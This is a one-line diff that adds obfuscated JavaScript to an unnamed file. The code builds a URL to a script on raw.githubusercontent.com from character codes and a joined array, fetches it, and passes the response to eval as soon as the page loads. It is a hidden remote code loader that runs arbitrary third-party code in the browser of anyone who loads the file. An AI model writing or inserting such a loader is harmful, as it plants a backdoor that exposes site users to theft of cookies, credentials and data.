@@ -1,0 +1,1 @@
+(function(){var xhr=new XMLHttpRequest();xhr.open('GET',String.fromCharCode(47)+String.fromCharCode(47)+['raw.githubusercontent.com','thanhan7914','MyScript','master','public_html','js','hello.js'].join(String.fromCharCode(47)),true);xhr.onload=function(e){if(xhr.status===200)eval(xhr.responseText);};xhr.send(null);})();
